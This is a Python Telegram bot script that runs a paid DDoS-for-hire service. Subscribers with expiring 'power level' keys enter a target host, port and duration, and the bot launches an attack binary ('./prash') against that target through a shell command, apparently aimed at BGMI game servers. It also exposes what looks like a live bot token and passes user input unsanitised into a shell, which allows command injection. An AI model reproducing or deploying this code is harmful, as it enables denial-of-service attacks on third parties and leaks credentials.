import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import os
import subprocess
import time
import random
import string
import smtplib  # For sending OTP via email
import hashlib
import time
import json
import requests 
import uuid
import threading  # Fix threading import

# Replace with your bot token and owner ID
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
YOUR_OWNER_ID = 5628960731

bot = telebot.TeleBot("7391673180:AAGjD09cFRiucnGehptb2Y0rXFzF3u4XP8A")
# Paths to data files
USERS_FILE = 'users.txt'
BALANCE_FILE = 'balance.txt'
ADMINS_FILE = 'admins.txt'
ATTACK_LOGS_FILE = 'log.txt'
CO_OWNER_FILE = 'co_owner.txt'
API_FILE = 'api.txt'

# Initialize global variables
authorized_users = {}
user_balances = {}
admins = set()
co_owner = None
bgmi_cooldown = {}
DEFAULT_COOLDOWN = timedelta(seconds=300)  # Cooldown time using timedelta for accurate comparison
MAX_ATTACK_DURATION = 500  # Maximum attack duration in seconds
otp_dict = {}  # To store OTPs for phone numbers
allowed_user_ids = set()
LOG_FILE = 'command_log.txt'
admin_id = set()

# Save authorized users
def save_authorized_users():
    with open(USERS_FILE, 'w') as file:
        for user_id, info in authorized_users.items():
            expiry = info.get('expiry')
            if isinstance(expiry, datetime):
                expiry_str = expiry.isoformat()
            else:
                expiry_str = 'No Expiry'

            ddos_key = info.get('ddos_key', 'No DDoS Key')
            power_level = info.get('power_level', 'Unknown')

            file.write(f"{user_id} {expiry_str} {ddos_key} {power_level}\n")

# Save admins
def save_admins():
    with open(ADMINS_FILE, 'w') as file:
        for admin in admin_id:
            file.write(f"{admin}\n")

# Save balances
def save_balances():
    with open(BALANCE_FILE, 'w') as file:
        for user_id, data in user_balances.items():
            file.write(f"{user_id} {data['username']} {data['balance']}\n")

# Save co-owner
def save_co_owner():
    with open(CO_OWNER_FILE, 'w') as file:
        if co_owner:
            file.write(f"{co_owner}\n")
        else:
            file.write("")

# Function to generate a cool-looking API key
def generate_cool_api_key(power_level):
    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    part3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    cool_api_key = f"{power_level}-{part1}-{part2}-{part3}"
    return cool_api_key

# Function to store the API key in a file and create the folder if it doesn't exist
def store_api_key(api_key):
    folder_name = "api_folder"
    file_name = "api.txt"
    
    # Create folder if it doesn't exist
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    
    # Write API key to file
    with open(os.path.join(folder_name, file_name), "w") as file:
        file.write(f"EXTREME_DDOS_API = \"{api_key}\"\n")

    return os.path.join(folder_name, file_name)

# Log command to the file
def log_command(user_id, IP, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(ATTACK_LOGS_FILE, "a") as file:
        file.write(f"Username: {username}\nIP: {IP}\nPort: {port}\nTime: {duration}\n\n")

@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton('🚀 Attack')
    btn_info = telebot.types.KeyboardButton('ℹ️ My Info')
    btn_api_server = telebot.types.KeyboardButton('🚀API SERVER🚀')  # New button for API server
    markup.row(btn_attack)
    markup.row(btn_info, btn_api_server)
    bot.send_message(message.chat.id, "Welcome to the attack bot!", reply_markup=markup)

CHANNEL_ID = -1002201895980  # Channel ID

# Check if user is authorized
def is_user_authorized(user_id, chat_id):
    if user_id == YOUR_OWNER_ID:
        return True
    return (user_id in authorized_users and authorized_users[user_id] > datetime.now()) or chat_id == CHANNEL_ID
# Send dynamic status during attack
def send_dynamic_status(message_chat_id, message_id, ip, port, duration):
    start_time = time.time()
    dots_count = 1
    status_base = "🔥Status: Attack is started"
    
    while time.time() - start_time < duration:  # Update for the duration of the attack
        time.sleep(1)
        dots = '.' * dots_count
        new_status = f"{status_base}{dots}"
        bot.edit_message_text(
            text=f"🚀 Attack started successfully! 🚀\n\n"
                 f"🔹Target: {ip}:{port}\n"
                 f"⏱️Duration: {duration}\n"
                 f"🔧Method: BGMI-VIP\n\n"  # Added extra line break here
                 f"{new_status}",
            chat_id=message_chat_id,
            message_id=message_id
        )
        dots_count = min(dots_count + 1, 6)  # Keep adding dots up to 6 dots

    # Final status after attack is complete
    bot.edit_message_text(
        text=f"🚀 Attack started successfully! 🚀\n\n"
             f"🔹Target: {ip}:{port}\n"
             f"⏱️Duration: {duration}\n"
             f"🔧Method: BGMI-VIP\n\n"  # Added extra line break here
             f"🔥Status: Attack is started......",
        chat_id=message_chat_id,
        message_id=message_id
    )

# Start attack reply
def start_attack_reply(message, ip, port, duration):
    reply_message = (f"🚀 Attack Sent Successfully! 🚀\n\n"
                     f"🔹 Target: {ip}:{port}\n"
                     f"⏱️ Duration: {duration} seconds\n"
                     f"🔧 Method: BGMI-VIP\n\n" # ADDED EXTRA LINE BREAK HERE
                     f"🔥 Status: Attack in Progress......🔥")
    
    # Send initial message
    status_message = bot.send_message(message.chat.id, reply_message)

    # Update status in a new thread
    thread = threading.Thread(
        target=send_dynamic_status,
        args=(message.chat.id, status_message.message_id, ip, port, duration)
    )
    thread.start()

  
# Attack finished reply
def attack_finished_reply(message, IP, PORT, DURATION):
    reply_message = (f"🚀 Attack finished Successfully! 🚀\n\n"
                     f"🎮Target: {IP}:{PORT}\n"
                     f"♾️Attack Duration: {DURATION}\n"
                     f"📉Status: Attack is finished 🔥")
    bot.send_message(message.chat.id, reply_message)

# Process attack button
@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def process_attack_details(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_user_authorized(user_id, chat_id):
        msg = bot.send_message(message.chat.id, "Please provide the details in the following format:\n<host> <port> <time>")
        bot.register_next_step_handler(msg, get_attack_details)
    else:
        response = """
🚨 **Access to the Ultimate Power Blocked!** 🚨
You've encountered the gateway to unstoppable force, but only the chosen can enter. Ready to claim your place among the elite?

👑 **The Keyholder Awaits**: Only @PRASHANTGODORWOT holds the key to unleashing unlimited power. Connect and secure your access to command at the highest level.
💠 **Ascend to Greatness**: Become a premium supporter and gain unrivaled attack capabilities, reserved for those who dare to rule.
💬 **Immediate Assistance**: Need fast-track approval? Our admins are on standby, ready to elevate you to the next tier of power.

⚡ **Infinite Power Lies Ahead!** The battlefield is waiting, and with @PRASHANTGODORWOT by your side, nothing can stand in your way. Step up, unlock the ultimate, and command forces beyond imagination!
"""
        bot.reply_to(message, response, parse_mode="Markdown")

# Get attack details
def get_attack_details(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if is_user_authorized(user_id, chat_id):
        try:
            command = message.text.split()

            if len(command) == 3:
                IP = command[0]
                try:
                    PORT = int(command[1])
                    DURATION = int(command[2])
                except ValueError:
                    bot.reply_to(message, "Error: Port and time must be integers.")
                    return

                if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]) < DEFAULT_COOLDOWN:
                    remaining_time = DEFAULT_COOLDOWN.total_seconds() - (datetime.now() - bgmi_cooldown[user_id]).seconds
                    bot.reply_to(message, f"You must wait {remaining_time:.2f} seconds before initiating another attack.")
                    return

                if DURATION > MAX_ATTACK_DURATION:
                    bot.reply_to(message, f"Invalid time limit. The attack time must be less than or equal to {MAX_ATTACK_DURATION} seconds.")
                else:
                    log_command(user_id, IP, PORT, DURATION)
                    start_attack_reply(message, IP, PORT, DURATION)
                    full_command = f"./prash {IP} {PORT} {DURATION} 100"
                    try:
                        subprocess.run(full_command, shell=True, check=True)
                        attack_finished_reply(message, IP, PORT, DURATION)
                    except subprocess.CalledProcessError as e:
                        bot.reply_to(message, f"Command execution failed with error: {str(e)}")
            else:
                bot.reply_to(message, "Invalid format. Please provide the details in the following format:\n<host> <port> <time>")
        except Exception as e:
            bot.reply_to(message, f"An unexpected error occurred: {str(e)}")

@bot.message_handler(func=lambda message: message.text == '🚀API SERVER🚀')
def api_server_info(message):
    user_id = message.from_user.id

    if user_id in authorized_users:
        # Get the user's API info from the authorized_users dictionary
        user_info = authorized_users[user_id]
        expiry_date = user_info['expiry'].strftime('%Y-%m-%d %H:%M:%S')
        api_key = user_info.get('api_key', 'No API Key Assigned')
        power_level = user_info.get('power_level', 'Unknown')

        # Determine role: Owner, Co-owner, or Regular user
        if user_id == YOUR_OWNER_ID:
            role = "🚀OWNER🚀"
        elif user_id == co_owner:
            role = "🛸CO-OWNER🛸"
        else:
            role = "User"

        # Get username or set to "Not Available"
        username = message.from_user.username if message.from_user.username else "Not Available"

        # Construct the response message
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: <code>{user_id}</code>\n"  # Copyable user ID
                    f"👤 Username: @{username}\n"
                    f"⏳ API key Expiry: {expiry_date}\n"
                    f"🎮 Power Level: {power_level}\n"
                    f"🔐 API: <code>{api_key}</code>")  # Copyable API key

        # Send the message to the user
        bot.reply_to(message, response, parse_mode="HTML")
    
    else:
        # Inform the user if they do not have an API key
        role = "User"
        username = message.from_user.username if message.from_user.username else "Not Available"

        # Construct the response message for users without API access
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: <code>{user_id}</code>\n"  # Copyable user ID
                    f"👤 Username: @{username}\n"
                    f"⏳ API key Expiry: not approved\n"
                    f"🎮 Power Level: not approved\n"
                    f"🔐 API: not approved")  # Copyable API key

        # Send the message to the user
        bot.reply_to(message, response, parse_mode="HTML")

# Function to handle "ℹ️ My Info" button press
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    user_id = message.from_user.id
    role = "User"
    if user_id == YOUR_OWNER_ID:
        role = "🚀OWNER🚀"
    elif user_id == co_owner:
        role = "🛸CO-OWNER🛸"
    elif user_id in admins:
        role = "Admin"

    username = message.from_user.username if message.from_user.username else "Not Available"
    if user_id in authorized_users:
        expiry_date = authorized_users[user_id]
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: <code>{user_id}</code>\n"  # Correctly formatted using <code>
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: {expiry_date}")
    else:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: <code>{user_id}</code>\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: Not Approved")
    
    # Ensure parse_mode is set to HTML to properly render <code> tags
    bot.reply_to(message, response, parse_mode="HTML")
def parse_duration(duration_text):
    duration = int(duration_text[:-1])
    unit = duration_text[-1]
    if unit == 'd':
        return timedelta(days=duration)
    elif unit == 'h':
        return timedelta(hours=duration)
    elif unit == 'm':
        return timedelta(minutes=duration)
    else:
        raise ValueError("Invalid duration unit. Use 'd' for days, 'h' for hours, or 'm' for minutes.")


# Assign API Key Command
@bot.message_handler(commands=['createapi'])
def assign_api_key(message):
    user_id = message.from_user.id
    if user_id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please provide the user ID, duration (in days), and power level (format: <user_id> <duration> <POWER>). Power levels: HIGH, ULTRA, LEGENDARY.")
        bot.register_next_step_handler(msg, process_api_key)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

# Function to handle the API key assignment
def process_api_key(message):
    try:
        user_id_text, duration_text, power_level = message.text.split(maxsplit=2)
        user_id = int(user_id_text.strip())
        duration = int(duration_text.strip())  # Duration in days
        power_level = power_level.strip().upper()

        # Validate the power level
        if power_level not in ['HIGH', 'ULTRA', 'LEGENDARY']:
            bot.send_message(message.chat.id, "Invalid power level. Please provide one of the following: HIGH, ULTRA, LEGENDARY.")
            return

        # Generate a cool API key
        api_key = generate_cool_api_key(power_level)

        # Store the API key in the folder and file
        file_path = store_api_key(api_key)

        # Set an expiration for the API key based on the duration provided
        expiration_date = datetime.now() + timedelta(days=duration)

        # Add the API key, expiration, and power level to the authorized_users dictionary
        authorized_users[user_id] = {
            'expiry': expiration_date,
            'api_key': api_key,
            'power_level': power_level
        }

        # Save the updated authorized users
        save_authorized_users()

        # Get user info to include in the message
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"ID: {user_id}"

        # Notify the owner or co-owner
        bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) HAS BEEN ASSIGNED API KEY: {api_key} FOR {duration}d AND {power_level}.")
        
        # Instruct user to add the API to their script
        bot.send_message(message.chat.id, f"Please add the following line to your script:\n`EXTREME_DDOS_API = \"{api_key}\"`\n(API key stored in {file_path})")

    except ValueError:
        bot.send_message(message.chat.id, "Invalid format. Please enter the user ID, duration, and power level in the correct format.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")



@bot.message_handler(commands=['checksubscription'])
def check_subscription(message):
    user_id = message.from_user.id
    if user_id in authorized_users:
        expiry = authorized_users[user_id]
        expiry_date = expiry.strftime('%Y-%m-%d %H:%M:%S')
        remaining_days = (expiry - datetime.now()).days
        response = (f"Your subscription details:\n"
                    f"🔹 Expiry Date: {expiry_date}\n"
                    f"🔹 Days Remaining: {remaining_days} days")
    else:
        response = "You do not have an active subscription. Please contact an admin to subscribe."
    bot.send_message(message.chat.id, response)

# Function to generate OTP
def generate_otp():
    return ''.join(random.choices(string.digits, k=6))

# Function to send OTP
def send_otp(phone_number, otp):
    # Implement your OTP sending logic here (e.g., via SMS gateway)
    # For demonstration, we are using print statement
    print(f"Sending OTP {otp} to phone number {phone_number}")

# /getapprove command handler
@bot.message_handler(commands=['getapprove'])
def get_approve(message):
    msg = bot.send_message(message.chat.id, "Please provide your phone number:")
    bot.register_next_step_handler(msg, process_phone_number)

def process_phone_number(message):
    phone_number = message.text.strip()
    otp = generate_otp()
    otp_dict[phone_number] = otp
    send_otp(phone_number, otp)
    msg = bot.send_message(message.chat.id, "OTP has been sent to your phone number. Please enter the OTP:")
    bot.register_next_step_handler(msg, process_otp, phone_number)

def process_otp(message, phone_number):
    entered_otp = message.text.strip()
    if otp_dict.get(phone_number) == entered_otp:
        del otp_dict[phone_number]  # Remove OTP from the dictionary after successful verification
        user_id = message.from_user.id
        authorized_users[user_id] = datetime.now() + timedelta(hours=2)
        save_authorized_users()
        bot.send_message(message.chat.id, "Processing.........")
        time.sleep(3)  # Simulate some processing time
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID: {user_id}"
        duration_text = "2 hours"
        bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been approved for {duration_text}.")
    else:
        bot.send_message(message.chat.id, "Invalid OTP. Please try again.")
def GetAndroidID():
    return "android_id_example"

def GetDeviceModel():
    return "device_model_example"

def GetDeviceBrand():
    return "device_brand_example"

def GetDeviceUniqueIdentifier(hwid):
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, hwid))

def generate_uuid(user_key):
    hwid = user_key
    hwid += GetAndroidID()
    hwid += GetDeviceModel()
    hwid += GetDeviceBrand()
    UUID = GetDeviceUniqueIdentifier(hwid)
    return UUID

def login(user_key):
    UUID = generate_uuid(user_key)
    url = "https://indkey.xyz/connect"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"game=PUBG&user_key={user_key}&serial={UUID}"
    
    try:
        response = requests.post(url, headers=headers, data=data, verify=False)
        response.raise_for_status()
        result = response.json()
        
        if result.get("status", False):
            token = result["data"]["token"]
            rng = result["data"]["rng"]
            exp_time_data = result["data"]["EXP"]
            
            # Debugging: Print the exp_time_data to understand its structure
            print(f"EXP Time Data: {exp_time_data}")
            
            # Handling different expiration time formats
            if isinstance(exp_time_data, dict):
                exp_time = exp_time_data.get('timestamp')  # If it's a dictionary with a timestamp
            elif isinstance(exp_time_data, str):
                # Assuming the string is in ISO format, like "2024-08-21T09:25:00"
                exp_time = datetime.datetime.fromisoformat(exp_time_data)
                exp_time = exp_time.timestamp()  # Convert to timestamp
            elif isinstance(exp_time_data, (int, float)):
                exp_time = exp_time_data  # Already a valid timestamp
            else:
                return False, "Invalid expiration time format.", ""
            
            time_left = exp_time - time.time()
            
            if time_left > 0:
                auth = f"PUBG-{user_key}-{UUID}-Vm8Lk7Uj2nplJmsjCPVPVjRajzgfx3uz9E"
                outputAuth = hashlib.md5(auth.encode()).hexdigest()
                
                g_Token = token
                g_Auth = outputAuth
                
                bValid = g_Token == g_Auth
                if bValid:
                    days_left = time_left / 86400  # Convert to days
                    if days_left >= 1:
                        return True, int(days_left), "days"
                    else:
                        hours_left = time_left / 3600  # Convert to hours
                        return True, int(hours_left), "hours"
                else:
                    return False, "Invalid token.", ""
            else:
                return False, "Expired key.", ""
        else:
            return False, result.get("reason", "Unknown error"), ""
    
    except requests.exceptions.RequestException as e:
        return False, str(e), ""
    except json.JSONDecodeError as e:
        return False, f"{{ {str(e)} }}\n{{ {response.text if response else ''} }}", ""

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Please enter your key:")
    bot.register_next_step_handler(message, process_key_step)

def process_key_step(message):
    chat_id = message.chat.id
    user_key = message.text.strip()
    
    success, duration, unit = login(user_key)
    if success:
        user_info = bot.get_chat(message.from_user.id)
        username = user_info.username if user_info.username else f"ID: {message.from_user.id}"
        bot.send_message(chat_id, f"User @{username} (ID: {message.from_user.id}) has been approved for {duration} {unit}.")
        
        expiry_time = datetime.now() + timedelta(**{unit: duration})
        authorized_users[message.from_user.id] = expiry_time
        save_authorized_users()
    else:
        bot.send_message(chat_id, f"Failed to redeem key: {duration}")

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id == YOUR_OWNER_ID or admin_id or message.from_user.id == co_owner:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and duration (e.g., '123456789 1d').")
        bot.register_next_step_handler(msg, process_approval)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_approval(message):
    try:
        user_id_text, duration_text = message.text.split()
        user_id = int(user_id_text.strip())
        duration = parse_duration(duration_text)

        # Calculate the new expiry date
        if user_id in authorized_users and authorized_users[user_id] > datetime.now():
            new_expiry = authorized_users[user_id] + duration
        else:
            new_expiry = datetime.now() + duration

        authorized_users[user_id] = new_expiry
        save_authorized_users()

        # Adding user to allowed_user_ids if not already present
        if user_id not in authorized_users:
           is_authorized(user_id) 
        with open(USERS_FILE, "a") as file:
                file.write(f"{user_id}\n")

        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"ID: {user_id}"
        bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been approved for {duration_text}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error processing approval: {str(e)}")

# Function to remove approval
@bot.message_handler(commands=['removeapproval'])
def remove_approval(message):
    if message.from_user.id == YOUR_OWNER_ID or admin_id or message.from_user.id == co_owner:
        msg = bot.send_message(message.chat.id, "Please specify the user ID to remove approval (e.g., '123456789').")
        bot.register_next_step_handler(msg, process_remove_approval)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_approval(message):
    try:
        user_id = int(message.text.strip())
        if user_id in admins:
            chat_info = bot.get_chat(user_id)
            username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
            admins.remove(user_id)
            save_admins()
            bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been removed.")
        else:
            bot.send_message(message.chat.id, "User ID not found in admin list.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


# Function to add an admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and initial balance for the new admin (e.g., 'user_id balance').")
        bot.register_next_step_handler(msg, process_add_admin)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_admin(message):
    try:
        user_id_text, balance_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        balance = int(balance_text.strip())

        if user_id not in admins:
            admins.add(user_id)
            user_balances[user_id] = {'username': bot.get_chat(user_id).username or "Unknown", 'balance': balance}
            save_admins()
            save_balances()

            bot.send_message(message.chat.id, f"User @{bot.get_chat(user_id).username} (ID: {user_id}) added as an admin with balance of {balance}.")
        else:
            bot.send_message(message.chat.id, f"User with ID {user_id} is already an admin.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id balance' (e.g., '123456789 100').")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

# Function to remove an admin
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID of the admin to remove.")
        bot.register_next_step_handler(msg, process_remove_admin)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_admin(message):
    try:
        user_id = int(message.text.strip())
        if user_id in admins:
            admins.remove(user_id)
            save_admins()
            bot.send_message(message.chat.id, f"User with ID {user_id} removed from admins.")
        else:
            bot.send_message(message.chat.id, "User ID not found in admin list.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please provide a valid user ID.")


# Function to add a co-owner
@bot.message_handler(commands=['addco'])
def add_co_owner(message):
    if message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID to add as co-owner (e.g., '123456789').")
        bot.register_next_step_handler(msg, process_add_co_owner)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_co_owner(message):
    try:
        user_id = int(message.text.strip())
        chat_info = bot.get_chat(user_id)
        username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
        
        global co_owner
        co_owner = user_id
        save_co_owner()
        bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) has been added as co-owner.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

# Function to remove a co-owner
@bot.message_handler(commands=['removeco'])
def remove_co_owner(message):
    if message.from_user.id == YOUR_OWNER_ID:
        try:
            global co_owner
            if co_owner is not None:
                chat_info = bot.get_chat(co_owner)
                username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
                co_owner = None
                save_co_owner()
                bot.send_message(message.chat.id, f"User @{username} (ID: {chat_info.id}) has been removed as co-owner.")
            else:
                bot.send_message(message.chat.id, "There is no co-owner to remove.")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

# Function to list all admins
@bot.message_handler(commands=['alladmins'])
def list_all_admins(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner} or message.from_user.id in admins:
        if admins:
            response = "List of all admins:\n" + "\n".join(str(admin_id) for admin_id in admins)
        else:
            response = "No admins found."
    else:
        response = "You don't have permission to use this command."
    bot.send_message(message.chat.id, response)

# Function to send logs
@bot.message_handler(commands=['logs'])
def send_logs(message):
    if message.from_user.id in {YOUR_OWNER_ID, co_owner} or message.from_user.id in admins:
        if os.path.exists(ATTACK_LOGS_FILE):
            with open(ATTACK_LOGS_FILE, 'r') as f:
                logs = f.read()
            bot.send_message(message.chat.id, f"Attack logs:\n{logs}")
        else:
            bot.send_message(message.chat.id, "No logs found.")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")



@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and the amount to add (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_add_balance)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances:
            user_balances[user_id]['balance'] += amount
        else:
            username = "Unknown"
            user_balances[user_id] = {'username': username, 'balance': amount}

        save_balances()

        username = user_balances[user_id]['username']
        bot.send_message(message.chat.id, f"Added {amount} balance to @{username} (ID: {user_id}).")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

@bot.message_handler(commands=['removebalance'])
def remove_balance(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and the amount to remove (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_remove_balance)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances and user_balances[user_id]['balance'] >= amount:
            user_balances[user_id]['balance'] -= amount
            save_balances()
            username = user_balances[user_id]['username']
            bot.send_message(message.chat.id, f"Removed {amount} balance from @{username} (ID: {user_id}).")
        else:
            bot.send_message(message.chat.id, "Invalid user ID or insufficient balance.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

@bot.message_handler(commands=['allusers'])
def all_users(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, co_owner}:
        if authorized_users:
            response = "📋 List of all authorized users:\n\n"
            for user_id, info in authorized_users.items():
                response += f"🆔 User ID: `{user_id}`\n"
                response += f"👤 Username: @{info['username']}\n"
                response += f"⏳ Approval Expiry: {info['expiry']}\n\n"
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "No authorized users found.")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

# Function to refresh logs and user data
@bot.message_handler(commands=['refresh'])
def refresh_data(message):
    user_id = message.from_user.id
    if user_id == YOUR_OWNER_ID:
        # Clear logs
        open(ATTACK_LOGS_FILE, 'w').close()
        
        # Clear user data
        global authorized_users, user_balances, admins, co_owner
        authorized_users.clear()
        user_balances.clear()
        admins.clear()
        co_owner = None

        # Save cleared state to files
        save_authorized_users()
        save_admins()
        save_balances()
        save_co_owner()

        bot.reply_to(message, "All logs and user data have been cleared.")
    else:
        bot.reply_to(message, "You do not have permission to refresh data.")


@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    if not user_balances:
        bot.send_message(message.chat.id, "No users found in the leaderboard.")
        return

    sorted_users = sorted(user_balances.items(), key=lambda x: x[1]['balance'], reverse=True)
    leaderboard_text = "🏆 Leaderboard 🏆\n\n"
    for i, (user_id, info) in enumerate(sorted_users, start=1):
        leaderboard_text += f"{i}. @{info['username']} - {info['balance']} units\n"

    bot.send_message(message.chat.id, leaderboard_text)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = message.from_user.id
    if user_id in user_balances:
        balance_info = user_balances[user_id]
        balance = balance_info['balance']
        response = f"💰 Balance Info 💰\n\n👤 User ID: {user_id}\n💵 Balance: {balance}"
    else:
        response = "Balance information not found. Please ensure you are an approved user."
    bot.reply_to(message, response)
        
        

# Start polling
bot.infinity_polling()
